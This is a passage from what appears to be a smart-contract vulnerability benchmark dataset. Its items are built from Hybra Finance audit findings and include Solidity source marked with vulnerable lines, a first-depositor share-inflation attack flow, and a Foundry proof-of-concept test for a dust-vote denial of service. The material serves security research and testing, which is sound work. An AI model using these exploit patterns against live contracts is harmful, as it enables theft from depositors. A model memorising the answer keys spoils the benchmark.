            "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"./interfaces/IVotingEscrow.sol\";\r\nimport \"./interfaces/IVoter.sol\";\r\nimport \"./interfaces/IBribe.sol\";\r\nimport \"./interfaces/IRewardsDistributor.sol\";\r\nimport \"./interfaces/IGaugeManager.sol\";\r\nimport \"./interfaces/ISwapper.sol\";\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\n\r\n/**\r\n * @title GovernanceHYBR (gHYBR)\r\n * @notice Auto-compounding staking token that locks HYBR as veHYBR and compounds rewards\r\n * @dev Implements transfer restrictions for new deposits and automatic reward compounding\r\n */\r\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\r\n    using SafeERC20 for IERC20;\r\n    // Lock period for new deposits (configurable between 12-24 hours)\r\n    uint256 public transferLockPeriod = 24 hours;\r\n    uint256 public constant MIN_LOCK_PERIOD = 1 minutes;\r\n    uint256 public constant MAX_LOCK_PERIOD = 240 minutes;\r\n    uint256 public head_not_withdraw_time = 1200; // 5days\r\n    uint256 public tail_not_withdraw_time = 300; // 1day\r\n  \r\n    // Withdraw fee configuration (basis points, 10000 = 100%)\r\n    uint256 public withdrawFee = 100; // 1% default fee\r\n    uint256 public constant MIN_WITHDRAW_FEE = 10; // 0.1% minimum\r\n    uint256 public constant MAX_WITHDRAW_FEE = 1000; // 10% maximum\r\n    uint256 public constant BASIS = 10000;\r\n    address public Team; // Address to receive fees\r\n    uint256 public rebase;\r\n    uint256 public penalty;\r\n    uint256 public votingYield;\r\n    // User deposit tracking for transfer locks\r\n    struct UserLock {\r\n        uint256 amount;\r\n        uint256 unlockTime;\r\n    }\r\n    \r\n    mapping(address => UserLock[]) public userLocks;\r\n    mapping(address => uint256) public lockedBalance;\r\n    \r\n    // Core contracts\r\n    address public immutable HYBR;\r\n    address public immutable votingEscrow;\r\n    address public voter;\r\n    address public rewardsDistributor;\r\n    address public gaugeManager;\r\n    uint256 public veTokenId; // The veNFT owned by this contract\r\n    \r\n    // Auto-voting strategy\r\n    address public operator; // Address that can manage voting strategy\r\n    uint256 public lastVoteEpoch; // Last epoch when we voted\r\n    \r\n    // Reward tracking\r\n    uint256 public lastRebaseTime;\r\n    uint256 public lastCompoundTime;\r\n\r\n    // Swap module\r\n    ISwapper public swapper;\r\n\r\n    // Errors\r\n    error NOT_AUTHORIZED();\r\n    \r\n    // Events\r\n    event Deposit(address indexed user, uint256 hybrAmount, uint256 sharesReceived);\r\n    event Withdraw(address indexed user, uint256 shares, uint256 hybrAmount, uint256 fee);\r\n    event Compound(uint256 rewards, uint256 newTotalLocked);\r\n    event PenaltyRewardReceived(uint256 amount);\r\n    event TransferLockPeriodUpdated(uint256 oldPeriod, uint256 newPeriod);\r\n    event SwapperUpdated(address indexed oldSwapper, address indexed newSwapper);\r\n    event VoterSet(address voter);\r\n    event EmergencyUnlock(address indexed user);\r\n    event AutoVotingEnabled(bool enabled);\r\n    event OperatorUpdated(address indexed oldOperator, address indexed newOperator);\r\n    event DefaultVotingStrategyUpdated(address[] pools, uint256[] weights);\r\n    event AutoVoteExecuted(uint256 epoch, address[] pools, uint256[] weights);\r\n\r\n    constructor(\r\n        address _HYBR,\r\n        address _votingEscrow\r\n    ) ERC20(\"Growth HYBR\", \"gHYBR\") {\r\n        require(_HYBR != address(0), \"Invalid HYBR\");\r\n        require(_votingEscrow != address(0), \"Invalid VE\");\r\n        \r\n        HYBR = _HYBR;\r\n        votingEscrow = _votingEscrow;\r\n        lastRebaseTime = block.timestamp;\r\n        lastCompoundTime = block.timestamp;\r\n        operator = msg.sender; // Initially set deployer as operator\r\n    }\r\n    \r\n    \r\n    function setRewardsDistributor(address _rewardsDistributor) external onlyOwner {\r\n        require(_rewardsDistributor != address(0), \"Invalid rewards distributor\");\r\n        rewardsDistributor = _rewardsDistributor;\r\n    }\r\n    \r\n    function setGaugeManager(address _gaugeManager) external onlyOwner {\r\n        require(_gaugeManager != address(0), \"Invalid gauge manager\");\r\n        gaugeManager = _gaugeManager;\r\n    }\r\n\r\n    \r\n      /**\r\n     * @notice Modifier to check authorization (owner or operator)\r\n     */\r\n    modifier onlyOperator() {\r\n        if (msg.sender != operator) {\r\n            revert NOT_AUTHORIZED();\r\n        }\r\n        _;\r\n    }\r\n    /**\r\n     * @notice Deposit HYBR and receive gHYBR shares\r\n     * @param amount Amount of HYBR to deposit\r\n     * @param recipient Recipient of gHYBR shares\r\n     */\r\n    function deposit(uint256 amount, address recipient) external nonReentrant {\r\n        require(amount > 0, \"Zero amount\");\r\n        recipient = recipient == address(0) ? msg.sender : recipient;\r\n        \r\n        // Transfer HYBR from user first\r\n        IERC20(HYBR).transferFrom(msg.sender, address(this), amount);\r\n        \r\n        // Initialize veNFT on first deposit\r\n        if (veTokenId == 0) {\r\n            _initializeVeNFT(amount);\r\n        } else {\r\n            // Add to existing veNFT\r\n            IERC20(HYBR).approve(votingEscrow, amount);\r\n            IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\r\n\r\n            // Extend lock to maximum duration\r\n            _extendLockToMax();\r\n        }\r\n        \r\n        // Calculate shares to mint based on current totalAssets\r\n        uint256 shares = calculateShares(amount);\r\n        \r\n        // Mint gHYBR shares\r\n        _mint(recipient, shares);\r\n        \r\n        // Add transfer lock for recipient\r\n        _addTransferLock(recipient, shares);\r\n        \r\n        emit Deposit(msg.sender, amount, shares);\r\n    }\r\n\r\n    /**\r\n     * @notice Withdraw gHYBR shares and receive a new veNFT with proportional HYBR\r\n     * @dev Creates new veNFT using multiSplit to maintain proportional ownership\r\n     * @param shares Amount of gHYBR shares to burn\r\n     * @return userTokenId The ID of the new veNFT created for the user\r\n     */\r\n    function withdraw(uint256 shares) external nonReentrant returns (uint256 userTokenId) {\r\n        require(shares > 0, \"Zero shares\");\r\n        require(balanceOf(msg.sender) >= shares, \"Insufficient balance\");\r\n        require(veTokenId != 0, \"No veNFT initialized\");\r\n        require(IVotingEscrow(votingEscrow).voted(veTokenId) == false, \"Cannot withdraw yet\");\r\n        \r\n        uint256 epochStart = HybraTimeLibrary.epochStart(block.timestamp);\r\n        uint256 epochNext = HybraTimeLibrary.epochNext(block.timestamp);\r\n\r\n        require(block.timestamp >= epochStart + head_not_withdraw_time && block.timestamp < epochNext - tail_not_withdraw_time, \"Cannot withdraw yet\");\r\n\r\n        // Calculate proportional HYBR amount from veNFT\r\n        uint256 hybrAmount = calculateAssets(shares);\r\n        require(hybrAmount > 0, \"No assets to withdraw\");\r\n\r\n        // Calculate fee amount (from the HYBR amount, not shares)\r\n        uint256 feeAmount = 0;\r\n        if (withdrawFee > 0) {\r\n            feeAmount = (hybrAmount * withdrawFee) / BASIS;\r\n        }\r\n\r\n        // User receives amount minus fee\r\n        uint256 userAmount = hybrAmount - feeAmount;\r\n        require(userAmount > 0, \"Amount too small after fee\");\r\n\r\n        // Get actual HYBR locked amount (not voting power)\r\n        uint256 veBalance = totalAssets();\r\n        require(hybrAmount <= veBalance, \"Insufficient veNFT balance\");\r\n\r\n        uint256 remainingAmount = veBalance - userAmount - feeAmount;  \r\n        require(remainingAmount >= 0, \"Cannot withdraw entire veNFT\");\r\n\r\n        // Burn gHYBR shares (full amount)\r\n        _burn(msg.sender, shares);\r\n\r\n        // Use multiSplit to create two NFTs: one for user, one for contract\r\n        uint256[] memory amounts = new uint256[](3);\r\n        amounts[0] = remainingAmount; // Amount staying with gHYBR \r\n        amounts[1] = userAmount;      // Amount going to user (after fee)\r\n        amounts[2] = feeAmount;      // Amount going to fee recipient\r\n\r\n\r\n        uint256[] memory newTokenIds = IVotingEscrow(votingEscrow).multiSplit(veTokenId, amounts);\r\n    \r\n        // Update contract's veTokenId to the first new token\r\n        veTokenId = newTokenIds[0];\r\n        userTokenId = newTokenIds[1];\r\n        uint256 feeTokenId = newTokenIds[2];\r\n        // Note: userTokenId is transferred to user, they can manage their own lock time\r\n        IVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);\r\n        IVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId);\r\n        emit Withdraw(msg.sender, shares, userAmount, feeAmount);\r\n    }\r\n\r\n\r\n    /**\r\n     * @notice Internal function to initialize veNFT on first deposit\r\n     */\r\n    function _initializeVeNFT(uint256 initialAmount) internal {\r\n        // Create max lock with the initial deposit amount\r\n        IERC20(HYBR).approve(votingEscrow, type(uint256).max);\r\n        uint256 lockTime = HybraTimeLibrary.MAX_LOCK_DURATION;\r\n        \r\n        // Create lock with initial amount\r\n        veTokenId = IVotingEscrow(votingEscrow).create_lock_for(initialAmount, lockTime, address(this));\r\n        \r\n    }\r\n    \r\n    /**\r\n     * @notice Calculate shares to mint based on deposit amount\r\n     */\r\n    function calculateShares(uint256 amount) public view returns (uint256) {\r\n        uint256 _totalSupply = totalSupply();\r\n        uint256 _totalAssets = totalAssets();\r\n        if (_totalSupply == 0 || _totalAssets == 0) {\r\n            return amount;\r\n        }\r\n        return (amount * _totalSupply) / _totalAssets;\r\n    }\r\n    \r\n    /**\r\n     * @notice Calculate HYBR value of shares\r\n     */\r\n    function calculateAssets(uint256 shares) public view returns (uint256) {\r\n        uint256 _totalSupply = totalSupply();\r\n        if (_totalSupply == 0) {\r\n            return shares;\r\n        }\r\n        return (shares * totalAssets()) / _totalSupply;\r\n    }\r\n\r\n    \r\n    /**\r\n     * @notice Get total assets (HYBR) locked in veNFT\r\n     * @dev Returns actual HYBR amount, not voting power\r\n     */\r\n    function totalAssets() public view returns (uint256) {\r\n        if (veTokenId == 0) {\r\n            return 0;\r\n        }\r\n        // Get actual locked HYBR amount, not voting power\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        return uint256(int256(locked.amount));\r\n    }\r\n    \r\n    /**\r\n     * @notice Add transfer lock for new deposits\r\n     */\r\n    function _addTransferLock(address user, uint256 amount) internal {\r\n        uint256 unlockTime = block.timestamp + transferLockPeriod;\r\n        userLocks[user].push(UserLock({\r\n            amount: amount,\r\n            unlockTime: unlockTime\r\n        }));\r\n        lockedBalance[user] += amount;\r\n    }\r\n    \r\n\r\n\r\n    /**\r\n     * @notice Preview available balance (total - currently locked)\r\n     * @param user The user address to check\r\n     * @return available The current available balance for transfer\r\n     */\r\n    function previewAvailable(address user) external view returns (uint256 available) {\r\n        uint256 totalBalance = balanceOf(user);\r\n        uint256 currentLocked = 0;\r\n        \r\n        UserLock[] storage arr = userLocks[user];\r\n        for (uint256 i = 0; i < arr.length; i++) {\r\n            if (arr[i].unlockTime > block.timestamp) {\r\n                currentLocked += arr[i].amount;\r\n            }\r\n        }\r\n        \r\n        return totalBalance > currentLocked ? totalBalance - currentLocked : 0;\r\n    }\r\n    /**\r\n     * @notice Clean expired locks and update locked balance\r\n     * @param user The user address to clean locks for\r\n     * @return freed The amount of tokens freed from expired locks\r\n     */\r\n    function _cleanExpired(address user) internal returns (uint256 freed) {\r\n        UserLock[] storage arr = userLocks[user];\r\n        uint256 len = arr.length;\r\n        if (len == 0) return 0;\r\n\r\n        uint256 write = 0;\r\n        unchecked {\r\n            for (uint256 i = 0; i < len; i++) {\r\n                UserLock memory L = arr[i];\r\n                if (L.unlockTime <= block.timestamp) {\r\n                    freed += L.amount;\r\n                } else {\r\n                    if (write != i) arr[write] = L;\r\n                    write++;\r\n                }\r\n            }\r\n            if (freed > 0) {\r\n                lockedBalance[user] -= freed;\r\n            }\r\n            while (arr.length > write) {\r\n                arr.pop();\r\n            }\r\n        }\r\n    }\r\n    \r\n    \r\n    /**\r\n     * @notice Override transfer to implement lock mechanism\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        super._beforeTokenTransfer(from, to, amount);\r\n        \r\n        if (from != address(0) && to != address(0)) { // Not mint or burn\r\n            uint256 totalBalance = balanceOf(from);\r\n            \r\n            // Step 1: Check current available balance using cached lockedBalance\r\n            uint256 currentAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\r\n            \r\n            // Step 2: If current available >= amount, pass directly\r\n            if (currentAvailable >= amount) {\r\n                return;\r\n            }\r\n            \r\n            // Step 3: Not enough, clean expired locks and recalculate\r\n            _cleanExpired(from);\r\n            uint256 finalAvailable = totalBalance > lockedBalance[from] ? totalBalance - lockedBalance[from] : 0;\r\n            \r\n            // Step 4: Check final available balance\r\n            require(finalAvailable >= amount, \"Tokens locked\");\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @notice Claim all rewards from voting and rebase\r\n     */\r\n    function claimRewards() external onlyOperator {\r\n        require(voter != address(0), \"Voter not set\");\r\n        require(rewardsDistributor != address(0), \"Distributor not set\");\r\n              \r\n        // Claim rebase rewards from RewardsDistributor\r\n        uint256  rebaseAmount = IRewardsDistributor(rewardsDistributor).claim(veTokenId);\r\n        rebase += rebaseAmount;\r\n        // Claim bribes from voted pools\r\n        address[] memory votedPools = IVoter(voter).poolVote(veTokenId);\r\n        \r\n        for (uint256 i = 0; i < votedPools.length; i++) {\r\n            if (votedPools[i] != address(0)) {\r\n                address gauge = IGaugeManager(gaugeManager).gauges(votedPools[i]);\r\n                \r\n                if (gauge != address(0)) {\r\n                    // Prepare arrays for single bribe claim\r\n                    address[] memory bribes = new address[](1);\r\n                    address[][] memory tokens = new address[][](1);\r\n                    \r\n                    // Claim internal bribe (trading fees)\r\n                    address internalBribe = IGaugeManager(gaugeManager).internal_bribes(gauge);\r\n                    if (internalBribe != address(0)) {\r\n                        uint256 tokenCount = IBribe(internalBribe).rewardsListLength();\r\n                        if (tokenCount > 0) {\r\n                            address[] memory bribeTokens = new address[](tokenCount);\r\n                            for (uint256 j = 0; j < tokenCount; j++) {\r\n                                bribeTokens[j] = IBribe(internalBribe).bribeTokens(j);\r\n                            }\r\n                            bribes[0] = internalBribe;\r\n                            tokens[0] = bribeTokens;\r\n                            // Call claimBribes for this single bribe\r\n                            IGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\r\n                        }\r\n                    }\r\n                    \r\n                    // Claim external bribe\r\n                    address externalBribe = IGaugeManager(gaugeManager).external_bribes(gauge);\r\n                    if (externalBribe != address(0)) {\r\n                        uint256 tokenCount = IBribe(externalBribe).rewardsListLength();\r\n                        if (tokenCount > 0) {\r\n                            address[] memory bribeTokens = new address[](tokenCount);\r\n                            for (uint256 j = 0; j < tokenCount; j++) {\r\n                                bribeTokens[j] = IBribe(externalBribe).bribeTokens(j);\r\n                            }\r\n                            bribes[0] = externalBribe;\r\n                            tokens[0] = bribeTokens;\r\n                            // Call claimBribes for this single bribe\r\n                            IGaugeManager(gaugeManager).claimBribes(bribes, tokens, veTokenId);\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    \r\n \r\n\r\n    /**\r\n     * @notice Execute swap through the configured swapper module\r\n     * @param _params Swap parameters for the swapper module\r\n     */\r\n    function executeSwap(ISwapper.SwapParams calldata _params) external nonReentrant onlyOperator {\r\n        require(address(swapper) != address(0), \"Swapper not set\");\r\n\r\n        // Get token balance before swap\r\n        uint256 tokenBalance = IERC20(_params.tokenIn).balanceOf(address(this));\r\n        require(tokenBalance >= _params.amountIn, \"Insufficient token balance\");\r\n\r\n        // Approve swapper to spend tokens\r\n        IERC20(_params.tokenIn).safeApprove(address(swapper), _params.amountIn);\r\n\r\n        // Execute swap through swapper module\r\n        uint256 hybrReceived = swapper.swapToHYBR(_params);\r\n\r\n        // Reset approval for safety\r\n        IERC20(_params.tokenIn).safeApprove(address(swapper), 0);\r\n\r\n        // HYBR is now in this contract, ready for compounding\r\n        votingYield += hybrReceived;\r\n    }\r\n    \r\n    /**\r\n     * @notice Compound HYBR balance into veNFT (restricted to authorized users)\r\n     */\r\n    function compound() external onlyOperator {\r\n        \r\n        // Get current HYBR balance\r\n        uint256 hybrBalance = IERC20(HYBR).balanceOf(address(this));\r\n        \r\n        if (hybrBalance > 0) {\r\n            // Lock all HYBR to existing veNFT  \r\n            IERC20(HYBR).safeApprove(votingEscrow, hybrBalance);\r\n            IVotingEscrow(votingEscrow).deposit_for(veTokenId, hybrBalance);\r\n\r\n            // Extend lock to maximum duration\r\n            _extendLockToMax();\r\n\r\n            lastCompoundTime = block.timestamp;\r\n\r\n            emit Compound(hybrBalance, totalAssets());\r\n        }\r\n    }\r\n    \r\n    /**\r\n     * @notice Vote for gauges using the veNFT\r\n     * @param _poolVote Array of pools to vote for\r\n     * @param _weights Array of weights for each pool\r\n     */\r\n    function vote(address[] calldata _poolVote, uint256[] calldata _weights) external {\r\n        require(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\r\n        require(voter != address(0), \"Voter not set\");\r\n        \r\n        IVoter(voter).vote(veTokenId, _poolVote, _weights);\r\n        lastVoteEpoch = HybraTimeLibrary.epochStart(block.timestamp);\r\n        \r\n    }\r\n    \r\n    /**\r\n     * @notice Reset votes\r\n     */\r\n    function reset() external {\r\n        require(msg.sender == owner() || msg.sender == operator, \"Not authorized\");\r\n        require(voter != address(0), \"Voter not set\");\r\n        \r\n        IVoter(voter).reset(veTokenId);\r\n    }\r\n    \r\n    /**\r\n     * @notice Receive penalty rewards from rHYBR conversions\r\n     */\r\n    function receivePenaltyReward(uint256 amount) external {\r\n        \r\n        // Auto-compound penalty rewards to existing veNFT\r\n        if (amount > 0) {\r\n            IERC20(HYBR).approve(votingEscrow, amount);\r\n\r\n            if(veTokenId == 0){\r\n                _initializeVeNFT(amount);\r\n            } else{\r\n                IVotingEscrow(votingEscrow).deposit_for(veTokenId, amount);\r\n\r\n                // Extend lock to maximum duration\r\n                _extendLockToMax();\r\n            }\r\n        }\r\n        penalty += amount;\r\n        emit PenaltyRewardReceived(amount);\r\n    }\r\n       \r\n    /**\r\n     * @notice Set the voter contract\r\n     */\r\n    function setVoter(address _voter) external onlyOwner {\r\n        require(_voter != address(0), \"Invalid voter\");  \r\n        voter = _voter;\r\n        emit VoterSet(_voter);\r\n    }\r\n    \r\n    /**\r\n     * @notice Update transfer lock period\r\n     */\r\n    function setTransferLockPeriod(uint256 _period) external onlyOwner {\r\n        require(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, \"Invalid period\");\r\n        uint256 oldPeriod = transferLockPeriod;\r\n        transferLockPeriod = _period;\r\n        emit TransferLockPeriodUpdated(oldPeriod, _period);\r\n    }\r\n\r\n    /**\r\n     * @notice Set withdraw fee (in basis points)\r\n     * @param _fee Fee amount (10-30 basis points)\r\n     */\r\n    function setWithdrawFee(uint256 _fee) external onlyOwner {\r\n        require(_fee >= MIN_WITHDRAW_FEE && _fee <= MAX_WITHDRAW_FEE, \"Invalid fee\");\r\n        withdrawFee = _fee;\r\n    }\r\n\r\n\r\n    function setHeadNotWithdrawTime(uint256 _time) external onlyOwner {\r\n        head_not_withdraw_time = _time;\r\n    }\r\n\r\n    function setTailNotWithdrawTime(uint256 _time) external onlyOwner {\r\n        tail_not_withdraw_time = _time;\r\n    }\r\n    \r\n    /**\r\n     * @notice Set the swapper module\r\n     * @param _swapper Address of the swapper module\r\n     */\r\n    function setSwapper(address _swapper) external onlyOwner {\r\n        require(_swapper != address(0), \"Invalid swapper\");\r\n        address oldSwapper = address(swapper);\r\n        swapper = ISwapper(_swapper);\r\n        emit SwapperUpdated(oldSwapper, _swapper);\r\n    }\r\n    \r\n    /**\r\n     * @notice Set the team address\r\n     */\r\n    function setTeam(address _team) external onlyOwner {\r\n        require(_team != address(0), \"Invalid team\");\r\n        Team = _team;\r\n    }\r\n    \r\n    /**\r\n     * @notice Emergency unlock for a user (owner only)\r\n     */\r\n    function emergencyUnlock(address user) external onlyOperator {\r\n        delete userLocks[user];\r\n        lockedBalance[user] = 0;\r\n        emit EmergencyUnlock(user);\r\n    }\r\n\r\n    /**\r\n     * @notice Get user's locks info\r\n     */\r\n    function getUserLocks(address user) external view returns (UserLock[] memory) {\r\n        return userLocks[user];\r\n    }\r\n    \r\n    \r\n \r\n    \r\n  \r\n    \r\n    /**\r\n     * @notice Set operator address\r\n     */\r\n    function setOperator(address _operator) external onlyOwner {\r\n        require(_operator != address(0), \"Invalid operator\");\r\n        address oldOperator = operator;\r\n        operator = _operator;\r\n        emit OperatorUpdated(oldOperator, _operator);\r\n    }\r\n    \r\n\r\n\r\n\r\n    \r\n    /**\r\n     * @notice Get veNFT lock end time\r\n     */\r\n    function getLockEndTime() external view returns (uint256) {\r\n        if (veTokenId == 0) {\r\n            return 0;\r\n        }\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        return uint256(locked.end);\r\n    }\r\n\r\n    /**\r\n     * @notice Internal helper to safely extend lock to maximum duration\r\n     * @dev Calculates exact duration needed to reach max allowed unlock time\r\n     */\r\n    function _extendLockToMax() internal {\r\n        if (veTokenId == 0) return;\r\n\r\n        IVotingEscrow.LockedBalance memory locked = IVotingEscrow(votingEscrow).locked(veTokenId);\r\n        if (locked.isPermanent || locked.end <= block.timestamp) return;\r\n\r\n        uint256 maxUnlockTime = ((block.timestamp + HybraTimeLibrary.MAX_LOCK_DURATION) / HybraTimeLibrary.WEEK) * HybraTimeLibrary.WEEK;\r\n\r\n        // Only extend if difference is more than 2 hours\r\n        if (maxUnlockTime > locked.end + 2 hours) {\r\n            try IVotingEscrow(votingEscrow).increase_unlock_time(veTokenId, HybraTimeLibrary.MAX_LOCK_DURATION) {\r\n                // Extension successful\r\n            } catch {\r\n                // Extension failed, continue without error\r\n                // This can happen if already at max possible time or other constraints\r\n            }\r\n        }\r\n    }\r\n\r\n}",
            "vulnerable_lines": [
                144,
                238,
                492,
                493,
                494,
                495,
                496,
                497,
                498,
                499,
                500,
                501,
                502,
                503,
                504,
                505,
                506,
                507,
                508,
                509
            ],
            "vulnerable_functions": [
                "deposit",
                "receivePenaltyReward"
            ]
        },
        "context_files": [],
        "call_flow": "Attacker.deposit(dust) -> receivePenaltyReward(donation) -> Victim.deposit(amount) -> calculateShares rounds to 0 -> Attacker captures assets",
        "context_hint": "Missing minimum share check in deposit allows first depositor to inflate asset ratio via donations or deposit_for, capturing subsequent deposits.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M04",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-04",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "dos",
        "difficulty_tier": 3,
        "context_level": "single_file",
        "finding_title": "Dust vote on one pool prevents poke()",
        "finding_description": "Before describing the vulnerability, we should know that in ve3.3 systems, `poke` is important to make anyone reflect the decaying vote weight to prevent users from being inactive on votes to have their full weight votes on a pool. In `VoterV3` users choose what pools they want to vote for and the contract retrieves their `ve` weight upon doing so: uint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId); And upon voting for a pool, that weight affects the claimable share distribution of that pool compared to other pools. Since now we know the importance of the voting weight, and since ve NFT weight decay with time, there is a poke function to update the voting weight made on a pool previously to the decayed weight of that NFT. The `poke()` function is guarded to be called by the owner or through the `ve` contract which can have anyone depositing for a user or increasing his locked value even by `1wei` to poke him to reflect his new decayed weight on the voted pools. An attacker can do the following: 1. vote his full weight - 1wei on a dedicated pool 2. vote 1 wei on another pool 3. time passes with inactivity from his side - his ve decay but is not reflected on voted pools 4. users try to poke() him through known functions of the ve contract 5. poke() function reverts here File: VoterV3.sol 208: uint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight; 209:  210: require(votes[_tokenId][_pool] == 0, \"ZV\"); 211: require(_poolWeight != 0, \"ZV\"); Since the `1wei` vote multiplied by the decayed weight divided by totalVoteWeight rounds down to 0, hence this user becomes unpokable. Impact: The voted for pool will have inflated rewards distributed to him compared to other pools that have pokable users. Thinking of this attack at scale, the user will have advantage of having full voting weight if he votes immediately like having permanent lock weight without actually locking his balance permanently. Preventing anyone from preserving this invariant `A single veNFT’s total vote allocation ≤ its available voting power.` on his vote balance too.",
        "attack_scenario": "function test_dustVote_makesPokeDOS_dueToZeroPoolWeight() external { // Ensure BribeFactory is initialized so GaugeManager can create bribes during gauge creation BribeFactoryV3(address(bribeFactoryV3)).initialize( address(voter), address(gaugeManager), address(), address(tokenHandler) ); // Grant roles to allow token whitelisting and connector setup .setRoleFor(address(this), \"GOVERNANCE\"); .setRoleFor(address(this), \"GENESIS_MANAGER\"); // Whitelist tokens and set connector (HYBR as connector) address[] memory toks = new address[](3); toks[0] = address(hybr); toks[1] = address(gHybr); toks[2] = address(rewardHybr); tokenHandler.whitelistTokens(toks); tokenHandler.whitelistConnector(address(hybr)); // Create two pairs using HYBR as common connector token address pair0 = thenaFiFactory.createPair(address(hybr), address(gHybr), false); address pair1 = thenaFiFactory.createPair(address(hybr), address(rewardHybr), false); // Create gauges for both pairs so voter recognizes them as alive pools gaugeManager.createGauge(pair0, 0); gaugeManager.createGauge(pair1, 0); // Create a veNFT lock uint256 lockAmount = 1e18; hybr.approve(address(votingEscrow), lockAmount); uint tokenId = votingEscrow.create_lock(lockAmount, 2 weeks); // Vote with dust on one pool to set up zero rounding on subsequent poke address[] memory pools = new address[](2); pools[0] = pair0; pools[1] = pair1; uint256[] memory weights = new uint256[](2); weights[0] = 1e16 - 1; weights[1] = 1; // dust // Ensure we are past vote start window voter.vote(tokenId, pools, weights); // Advance time slightly so the NFT balance decays and dust path rounds to zero vm.warp(block.timestamp + 3); vm.expectRevert(bytes(\"ZV\")); // _poolWeight != 0 reverts with \"ZV\" voter.poke(tokenId); }",
        "fix_description": "Change `require(_poolWeight != 0, \"ZV\")` to `if (_poolWeight == 0) continue;` to skip dust votes.",
        "primary_file": {
            "path": "ve33/contracts/VoterV3.sol",
            "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.13;\r\n\r\nimport './libraries/Math.sol';\r\nimport './interfaces/IBribe.sol';\r\nimport './interfaces/IERC20.sol';\r\nimport './interfaces/IPairInfo.sol';\r\nimport './interfaces/IPairFactory.sol';\r\nimport './interfaces/IVotingEscrow.sol';\r\nimport './interfaces/IGaugeManager.sol';\r\nimport './interfaces/IPermissionsRegistry.sol';\r\nimport './interfaces/ITokenHandler.sol';\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\r\nimport \"@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol\";\r\n\r\ncontract VoterV3 is OwnableUpgradeable, ReentrancyGuardUpgradeable {\r\n    using SafeERC20Upgradeable for IERC20Upgradeable;\r\n\r\n    address public _ve;                                         // the ve token that governs these contracts\r\n    address internal base;                                      // $the token\r\n    address public permissionRegistry;                          // registry to check accesses\r\n    address public tokenHandler;                     \r\n    uint256 public maxVotingNum;\r\n    uint public EPOCH_DURATION;\r\n    uint256 internal constant MIN_VOTING_NUM = 10;\r\n    IGaugeManager public gaugeManager;\r\n    \r\n    mapping(uint256 => mapping(address => uint256)) public votes;  // nft      => pool     => votes\r\n    mapping(uint256 => address[]) public poolVote;                 // nft      => pools\r\n\r\n    mapping(address => uint256) public weights;\r\n    uint256 public totalWeight;\r\n    mapping(uint256 => uint256) public usedWeights;\r\n\r\n    mapping(uint256 => uint256) public lastVoted;                     // nft      => timestamp of last vote (this is shifted to thursday of that epoc)\r\n    mapping(uint256 => uint256) public lastVotedTimestamp;            // nft      => timestamp of last vote\r\n\r\n    event Voted(address indexed voter, uint256 tokenId, uint256 weight);\r\n    event Abstained(uint256 tokenId, uint256 weight);\r\n    event SetPermissionRegistry(address indexed old, address indexed latest);\r\n\r\n    constructor() {}\r\n\r\n    // function initialize(address __ve, address _pairFactory, address  _gaugeFactory, address _bribes, address _tokenHandler) initializer public {\r\n    function initialize(\r\n        address __ve,\r\n        address _tokenHandler,\r\n        address _gaugeManager,\r\n        address _permissionRegistry\r\n    ) public initializer {\r\n        __Ownable_init();\r\n        __ReentrancyGuard_init();\r\n        _ve = __ve;\r\n        base = IVotingEscrow(__ve).token();\r\n        gaugeManager = IGaugeManager(_gaugeManager);\r\n        permissionRegistry = _permissionRegistry;\r\n        tokenHandler = _tokenHandler;\r\n        maxVotingNum = 30;\r\n        EPOCH_DURATION = HybraTimeLibrary.WEEK;\r\n    }\r\n \r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    MODIFIERS\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    modifier VoterAdmin() {\r\n        require(IPermissionsRegistry(permissionRegistry).hasRole(\"VOTER_ADMIN\",msg.sender), 'VOTER_ADMIN');\r\n        _;\r\n    }\r\n\r\n    modifier Governance() {\r\n        require(IPermissionsRegistry(permissionRegistry).hasRole(\"GOVERNANCE\",msg.sender), 'GOVERNANCE');\r\n        _;\r\n    }\r\n\r\n    modifier GenesisManager() {\r\n        